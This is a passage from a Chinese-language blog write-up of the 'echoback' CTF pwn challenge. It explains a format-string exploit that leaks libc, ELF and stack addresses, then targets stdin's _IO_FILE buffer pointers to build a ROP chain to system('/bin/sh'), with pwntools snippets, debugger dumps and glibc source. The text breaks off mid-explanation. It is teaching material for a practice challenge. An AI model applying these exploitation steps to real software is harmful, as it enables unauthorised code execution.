<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OTHER WRITE UP FOR ME | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>OTHER WRITE UP FOR ME</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-11-08T12:25:49.000Z" id="date"> 2020-11-08</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-04-30T14:12:52.430Z" id="updated"> 2022-04-30</time></div></span><br><span>Word Count: <div class="control">29.1k</div></span><br><span>Read Time: <div class="control">153 min</div></span></div></div><hr><div id="post-content"><h1 id="OTHER-WRITE-UP-FOR-ME"><a href="#OTHER-WRITE-UP-FOR-ME" class="headerlink" title="OTHER WRITE UP FOR ME"></a>OTHER WRITE UP FOR ME</h1><h1 id="echoback"><a href="#echoback" class="headerlink" title="echoback"></a>echoback</h1><p>题目来源: World of Attack &amp; Defense</p>
<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_B80</span><span class="hljs-params">(_BYTE *a1)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> nbytes; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h] long int</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>((<span class="hljs-type">char</span> *)&amp;nbytes + <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8uLL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;length:&quot;</span>, <span class="hljs-number">0LL</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  getchar();<br>  <span class="hljs-keyword">if</span> ( (nbytes &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0LL</span> || (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)nbytes &gt; <span class="hljs-number">6</span> )<br>    LODWORD(nbytes) = <span class="hljs-number">7</span>; <span class="hljs-comment">//limits</span><br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">char</span> *)&amp;nbytes + <span class="hljs-number">4</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)nbytes);<br>  <span class="hljs-keyword">if</span> ( *a1 )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s say:&quot;</span>, a1);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;anonymous say:&quot;</span>, (<span class="hljs-type">char</span> *)&amp;nbytes + <span class="hljs-number">4</span>);<br>  <span class="hljs-built_in">printf</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;nbytes + <span class="hljs-number">4</span>);            <span class="hljs-comment">// fmt vum</span><br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>明显的字符串漏洞,但是最多只允许输入7个字符.</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链</p>
<h2 id="泄漏libc基址"><a href="#泄漏libc基址" class="headerlink" title="泄漏libc基址"></a>泄漏libc基址</h2><p>传入 %p调试到vfprintf函数堆栈如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x7ffe31470828 —▸ 0x7ffe3146e250 ◂— &#x27;anonymous say:&#x27;<br>07:0038│      0x7ffe31470830 —▸ 0x7f81d9132780 (_IO_stdfile_1_lock) ◂— 0x0<br>08:0040│      0x7ffe31470838 —▸ 0x7f81d8e632c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff<br>09:0048│      0x7ffe31470840 —▸ 0x7f81d9339700 ◂— 0x7f81d9339700<br>0a:0050│      0x7ffe31470848 ◂— 0xe<br>0b:0058│      0x7ffe31470850 ◂— 0x6562b026<br>0c:0060│      0x7ffe31470858 —▸ 0x7f81d91316a3 (_IO_2_1_stdout_+131) ◂— 0x132780000000000a <br>...           ...<br>28:0140│      0x7ffe31470938 ◂— 0x746df13682d53b00<br>29:0148│      0x7ffe31470940 —▸ 0x562293252d30 ◂— push   r15<br>2a:0150│      0x7ffe31470948 —▸ 0x7f81d8d8c830 (__libc_start_main+240) ◂— mov    edi, eax<br>2b:0158│      0x7ffe31470950 —▸ 0x7ffe31470a28 —▸ 0x7ffe31470fb8<br><br></code></pre></td></tr></table></figure>

<p>通过调试, 传入 %p打印时, 打印出0x7ffe31470830, 而 __libc_start_main+240 的地址在0x7ffe31470948, 调试不断加1进行核对地址,最终在 %19$p打印出libc_start_main + 240的地址.然后通过计算即可获取libc基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leaking libc base</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%19$p&#x27;</span><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	libc_start_main = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">240</span><br>	libc_base = libc_start_main - lib.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	sys_addr = libc_base + lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	sh_addr  = libc_base + lib.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br></code></pre></td></tr></table></figure>

<h2 id="泄漏elf基址"><a href="#泄漏elf基址" class="headerlink" title="泄漏elf基址"></a>泄漏elf基址</h2><p>传入 %14$p查看printf函数中堆栈分布如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">05:0028│ rdi  0x7ffc6b02ca80 ◂— 0xa7024343125 /* &#x27;%14$p\n&#x27; */<br>06:0030│      0x7ffc6b02ca88 ◂— 0xb8b63dff1d802400<br>07:0038│ rbp  0x7ffc6b02ca90 —▸ 0x7ffc6b02cac0 —▸ 0x55f4515b5d30 ◂— push   r15<br>08:0040│      0x7ffc6b02ca98 —▸ 0x55f4515b5d08 ◂— jmp    0x55f4515b5d0b<br>09:0048│      0x7ffc6b02caa0 —▸ 0x55f4515b5d30 ◂— push   r15<br>0a:0050│      0x7ffc6b02caa8 ◂— 0x200000000<br>0b:0058│      0x7ffc6b02cab0 ◂— 0x0<br>0c:0060│      0x7ffc6b02cab8 ◂— 0xb8b63dff1d802400<br></code></pre></td></tr></table></figure>

<p>打印出0x55f4515b5d30 ◂— push   r15, 而这个位置刚好在init函数的起始位置.在文件中偏移为: 0xD30 ( push    r15),这就可以计算elf的偏移了.然后获取main, pop rid的地址.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leaking elf base</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%14$p&#x27;</span><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	elf_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xD30</span><br>	main_addr = elf_base + <span class="hljs-number">0xC6C</span><br>	pop_rdi_ret = elf_base + <span class="hljs-number">0xd93</span><br>	li(<span class="hljs-string">&#x27;elf_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(elf_base))<br></code></pre></td></tr></table></figure>



<h2 id="泄漏堆栈中main-ret地址"><a href="#泄漏堆栈中main-ret地址" class="headerlink" title="泄漏堆栈中main ret地址"></a>泄漏堆栈中main ret地址</h2><p>下图为printf函数中的堆栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; stack 100<br>00:0000│ rsp  0x7fffb8e184a8 —▸ 0x55ff36954c55 ◂— nop    <br>01:0008│      0x7fffb8e184b0 —▸ 0x55ff36954ef8 ◂— xor    ebp, dword ptr [rsi] /* &#x27;3. exit&#x27; */<br>02:0010│      0x7fffb8e184b8 —▸ 0x7fffb8e18500 ◂— 0x0<br>03:0018│      0x7fffb8e184c0 ◂— 0xa32 /* &#x27;2\n&#x27; */<br>04:0020│      0x7fffb8e184c8 ◂— 0x7134b9900<br>05:0028│ rdi  0x7fffb8e184d0 ◂— 0xa7024353125 /* &#x27;%15$p\n&#x27; */<br>06:0030│      0x7fffb8e184d8 ◂— 0xc7f0a378134b9900<br>07:0038│ rbp  0x7fffb8e184e0 —▸ 0x7fffb8e18510 #泄漏该地址, 获取main ret<br>08:0040│      0x7fffb8e184e8 —▸ 0x55ff36954d08 ◂— jmp    0x55ff36954d0b<br>09:0048│      0x7fffb8e184f0 —▸ 0x55ff36954d30 ◂— push   r15<br>0a:0050│      0x7fffb8e184f8 ◂— 0x200000000<br>0b:0058│      0x7fffb8e18500 ◂— 0x0<br>0c:0060│      0x7fffb8e18508 ◂— 0xc7f0a378134b9900<br>0d:0068│      0x7fffb8e18510 —▸ 0x55ff36954d30 ◂— push   r15 # main rbp<br>0e:0070│      0x7fffb8e18518 —▸ 0x7fa5b79af830 (__libc_start_main+240) #mian的返回地址<br></code></pre></td></tr></table></figure>

<p>以上0x7fffb8e18518就是我们要获取的main ret的堆栈地址, 在这里不能直接泄漏堆栈中的main ret地址,但可以通过泄漏 rbp地址来+8即可获取man ret.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#leaking main ret in stack</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%12$p&#x27;</span><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	main_ret = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">0x8</span><br></code></pre></td></tr></table></figure>


<h2 id="修改-IO-FILE将数据打入stack"><a href="#修改-IO-FILE将数据打入stack" class="headerlink" title="修改_IO_FILE将数据打入stack"></a>修改_IO_FILE将数据打入stack</h2><p>目前,准备工作基本完毕, 现在就是要靠修改main ret地址来劫持程序流, 但是我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符，setName，它不是白放那里的，它有着重要的作用.</p>
<p>它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0</p>
<p>然后，发现，%16$p输出的就是a1的数据,于是，可以先setName(p64(addr))，然后利用%16$n来对addr处写数据然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7,于是，就需要用到一个新知识了，为了绕过7个字符的限制，利用printf漏洞先去攻击scanf内部结构，然后就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码.</p>
<h4 id="IO-FILE-struct"><a href="#IO-FILE-struct" class="headerlink" title="_IO_FILE struct"></a>_IO_FILE struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;    </span><br><span class="hljs-comment">_IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;    </span><br><span class="hljs-comment">_IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; </span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* The tag name of this struct is _IO_FILE to preserve historic </span><br><span class="hljs-comment">   C++ mangled names for functions taking FILE* arguments. </span><br><span class="hljs-comment">   That name should not be used in new code.  */</span>  <br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  <br>  <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  <br>  <span class="hljs-type">char</span> *_IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span>  <br>  <span class="hljs-type">char</span> *_IO_read_end;   <span class="hljs-comment">/* End of get area. */</span>  <br>  <span class="hljs-type">char</span> *_IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span>  <br>  <span class="hljs-type">char</span> *_IO_write_base; <span class="hljs-comment">/* Start of put area. */</span>  <br>  <span class="hljs-type">char</span> *_IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span>  <br>  <span class="hljs-type">char</span> *_IO_write_end;  <span class="hljs-comment">/* End of put area. */</span>  <br>  <span class="hljs-type">char</span> *_IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span>  <br>  <span class="hljs-type">char</span> *_IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span>  <br>  <br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span>  <br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span>  <br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span>  <br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span>  <br>  <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span>  <br>  <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span>  <br>  <br>  <span class="hljs-type">int</span> _fileno;  <br>  <span class="hljs-type">int</span> _flags2;  <br>  <span class="hljs-type">__off_t</span> _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span>  <br>  <br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;  <br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;  <br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];  <br>  <br>  _IO_lock_t *_lock;  <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span><br>&#125;;  <br></code></pre></td></tr></table></figure>

<h3 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h3><p>看看文件的读取过程**_IO_new_file_underflow** <strong>这个函数最终调用了_IO_SYSREAD****系统调用来读取文件。在这之前，它做了一些处理</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_underflow (FILE *fp)  <br>&#123;  <br>  <span class="hljs-type">ssize_t</span> count;  <br>  <br>  <span class="hljs-comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span>  <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)  <br>    <span class="hljs-keyword">return</span> EOF;  <br>  <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)  <br>    &#123;  <br>      fp-&gt;_flags |= _IO_ERR_SEEN;  <br>      __set_errno (EBADF);  <br>      <span class="hljs-keyword">return</span> EOF;  <br>    &#125;  <br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  <span class="hljs-comment">//判断是否已经读完</span><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;  <br>  <br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)  <br>    &#123;  <br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span>  <br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)  <br>    &#123;  <br>      <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);  <br>      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;  <br>    &#125;  <br>      _IO_doallocbuf (fp);  <br>    &#125;  <br>  <br>  <span class="hljs-comment">/* FIXME This can/should be moved to genops ?? */</span>  <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))  <br>    &#123;  <br>      <span class="hljs-comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t </span><br><span class="hljs-comment">     required by any standard.  My recollection is that </span><br><span class="hljs-comment">     traditional Unix systems did this for stdout.  stderr better </span><br><span class="hljs-comment">     not be line buffered.  So we do just that here </span><br><span class="hljs-comment">     explicitly.  --drepper */</span>  <br>      _IO_acquire_lock (_IO_stdout);  <br>  <br>      <span class="hljs-keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))  <br>      == (_IO_LINKED | _IO_LINE_BUF))  <br>    _IO_OVERFLOW (_IO_stdout, EOF);  <br>  <br>      _IO_release_lock (_IO_stdout);  <br>    &#125;  <br>  <br>  _IO_switch_to_get_mode (fp);  <br>  <br>  <span class="hljs-comment">/* This is very tricky. We have to adjust those </span><br><span class="hljs-comment">     pointers before we call _IO_SYSREAD () since </span><br><span class="hljs-comment">     we may longjump () out while waiting for </span><br><span class="hljs-comment">     input. Those pointers may be screwed up. H.J. */</span>  <br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  <br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  <span class="hljs-comment">//重新设置新的 _IO_buf_base</span><br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end  <br>    = fp-&gt;_IO_buf_base;  <br>  <span class="hljs-comment">//--------------------------------------</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  <span class="hljs-comment">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span><br>          fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="hljs-comment">//写入长度:fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span><br>    <br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)  <br>    &#123;  <br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)  <br>    fp-&gt;_flags |= _IO_EOF_SEEN;  <br>      <span class="hljs-keyword">else</span>  <br>    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="hljs-number">0</span>;  <br>  &#125;  <br>  fp-&gt;_IO_read_end += count; <span class="hljs-comment">//使 _IO_read_end指针向后移动 </span><br>  <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)  <br>    &#123;  <br>      <span class="hljs-comment">/* If a stream is read to EOF, the calling application may switch active </span><br><span class="hljs-comment">     handles.  As a result, our offset cache would no longer be valid, so </span><br><span class="hljs-comment">     unset it.  */</span>  <br>      fp-&gt;_offset = _IO_pos_BAD;  <br>      <span class="hljs-keyword">return</span> EOF;  <br>    &#125;  <br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)  <br>    _IO_pos_adjust (fp-&gt;_offset, count);  <br>  <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;  <br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>IO_SYSREAD系统调用，向fp-&gt;_IO_buf_base处写入读取的数据，并且长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</p>
<p>要是能够修改_IO_buf_base和_IO_buf_end 那么就可以实现任意位置和想要的长度</p>
<p>首先需要定位到_IO_2_1_stdin_结构体在内存中的位置，然后再定位到_IO_buf_base 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr &#x3D; _IO_buf_base + 0x8 * 7 (注意结构体对齐,int占用内存8字节,所以为 0x8 * 7 而不是 0x8 * 6 + 4)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#leaking_IO_buf_base</span><br>_IO_2_1_stdin_ = libc_base + lib.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>_IO_buf_base = _IO_2_1_stdin_ + <span class="hljs-number">0x8</span> * <span class="hljs-number">7</span><br>li(<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_buf_base))<br></code></pre></td></tr></table></figure>

<p>来看看_IO_buf_base的值</p>
